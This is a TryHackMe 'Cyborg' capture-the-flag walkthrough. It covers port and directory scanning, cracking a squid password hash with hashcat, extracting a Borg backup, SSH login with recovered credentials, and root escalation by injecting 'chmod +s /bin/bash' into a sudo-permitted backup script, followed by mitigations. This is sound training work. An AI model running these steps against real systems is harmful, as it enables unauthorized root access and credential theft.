# 🟩Cyborg - TryHackMe(THM) Walkthrough Report

**Prepared by:** Nishanth Antony  
**Date:** August 29, 2025  
**Difficulty:** Easy    
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps  
**Objective:** Identify open ports and accessible directories on the target.  
**Commands Used:**  
- `nmap -sC -sV -o nmap 10.10.148.94`  
- `gobuster dir -u http://10.10.148.94/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirs.log`  

**Findings:**  
- Open ports: SSH (22, OpenSSH 7.2p2) and HTTP (80, Apache 2.4.18).  
- HTTP default page confirmed; Gobuster revealed `/admin` directory.  
- `/admin` contained a music producer landing page with a downloadable `archive.tar`.  
- Shoutbox mentioned a squid proxy and config files in `/etc/squid/squid.conf`.  
- `/etc` directory and `squid.conf` contained a password hash file.  

---

## 2. Exploitation Process  
**Step 1 – Web Enumeration**  
- Accessed `/admin`, downloaded `archive.tar`.  
- Extracted `archive.tar`:  
  ```bash
  tar -xvf archive.tar
  home/field/dev/final_archive/
  home/field/dev/final_archive/hints.5
  home/field/dev/final_archive/integrity.5
  home/field/dev/final_archive/config
  home/field/dev/final_archive/README
  home/field/dev/final_archive/nonce
  home/field/dev/final_archive/index.5
  home/field/dev/final_archive/data/0/
  home/field/dev/final_archive/data/0/5
  home/field/dev/final_archive/data/0/3
  home/field/dev/final_archive/data/0/4
  home/field/dev/final_archive/data/0/1
  ```
- `README` indicated a Borg Backup repository.  

**Step 2 – Password Extraction**  
- Identified hash in `squid.conf`: `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`.  
- Cracked hash with hashcat:  
  ```bash
  hashcat --force -m 1600 -a 0 hash /home/kali/rockyou.txt
  $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
  ```
- Extracted Borg archive:  
  `borg extract /path/to/archive::music_archive` with password `squidward`.  
- Found `note.txt` in `home/alex/Documents` with credentials: `alex:S3cretP@s3`.  

**Step 3 – SSH Access as Alex**  
- Logged in via SSH:  
  `ssh alex@10.10.148.94`  
- Retrieved user flag:  
  ```bash
  alex@ubuntu:~$ ls
  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
  alex@ubuntu:~$ cat user.txt
  flag{************FLAG**************}
  ```
- Outcome: User flag retrieved.  

**Step 4 – Privilege Escalation**  
- Checked sudo permissions:  
  `sudo -l`  
- Found alex could run `/etc/mp3backups/backup.sh` as root without password:  
  ```
  (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
  ```
- Analyzed `backup.sh`:  
  ```bash
  #!/bin/bash
  sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt
  input="/etc/mp3backups/backed_up_files.txt"
  while getopts c: flag
  do
          case "${flag}" in 
                  c) command=${OPTARG};;
          esac
  done
  backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 ..."
  dest="/etc/mp3backups/"
  hostname=$(hostname -s)
  archive_file="$hostname-scheduled.tgz"
  echo "Backing up $backup_files to $dest/$archive_file"
  tar czf $dest/$archive_file $backup_files
  echo
  echo "Backup finished"
  cmd=$($command)
  echo $cmd
  ```
- Exploited command injection:  
  `sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"`  
- Gained root shell:  
  ```bash
  alex@ubuntu:/etc/mp3backups$ bash -p
  bash-4.3# whoami
  root
  bash-4.3# cat /root/root.txt
  flag{***************FLAG***************}
  ```
- Outcome: Root flag retrieved.  

---

## 3. Proof of Concept (PoC)  
- **Hash Cracking:**  
  `hashcat --force -m 1600 -a 0 hash /home/kali/rockyou.txt` yielded `squidward`.  
- **Borg Extraction:**  
  `borg extract /path/to/archive::music_archive` with `squidward`.  
- **Privilege Escalation:**  
  `sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"` followed by `bash -p`.  

---

## 4. Privilege Escalation  
- Exploited `backup.sh` command injection to set SUID on `/bin/bash`, gaining root shell.  

---

## 5. Mitigation Recommendations  
- **Web Server Hardening:**  
  - Restrict access to sensitive directories (e.g., `/admin`).  
- **Authentication Security:**  
  - Use strong passwords and multi-factor authentication for SSH.  
- **File Security:**  
  - Avoid storing credentials in plaintext files (e.g., `note.txt`).  
- **Sudo Configuration:**  
  - Avoid allowing command-line arguments in sudo scripts (e.g., remove `-c` option).  
- **Patch Management:**  
  - Update Apache and OpenSSH to latest versions.  
  - Monitor for unauthorized script modifications.  

---

## 6. Lessons Learned  
- **Command Injection:** Unrestricted script arguments can lead to privilege escalation.  
- **Credential Exposure:** Plaintext credentials in files are a significant risk.  
- **Backup Security:** Poorly configured backup scripts can be exploited.  

---

## 7. Skills Practiced  
- Network scanning (nmap)  
- Web directory enumeration (gobuster)  
- Hash cracking (hashcat)  
- Backup archive extraction (borg)  
- SSH access and privilege escalation  
- Secure reporting and mitigation strategies  
